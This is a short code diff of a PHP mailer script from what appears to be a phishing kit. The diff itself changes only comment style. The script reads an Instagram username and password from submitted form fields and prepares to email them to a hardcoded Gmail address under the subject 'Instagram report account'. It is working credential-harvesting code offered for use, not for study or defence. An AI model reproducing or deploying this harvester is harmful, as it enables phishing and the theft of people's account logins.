@@ -4,17 +4,17 @@
 #            Mailer: Imam                       # 
 #            Modifer: Mr.Ackerman~              # 
 #===============================================#
-/* PLEASE DON'T CHANGE COPYRIGHT! */
+    //PLEASE DON'T CHANGE COPYRIGHT! 
 
 $subjek = 'Instagram report account';
 $mailto = 'imamnurcakra@gmail.com'; //YOUR EMAIL ADDRESS
 
-/* This function for take input field. */
+   //This function for take input field. 
 
 $imel = $_POST['user'];
 $paswot = $_POST['password'];
 
-/* take information to send on your gmail !. */
+   //take information to send on your gmail !. 
 
 $body = <<<EOD
 <br><hr><br>
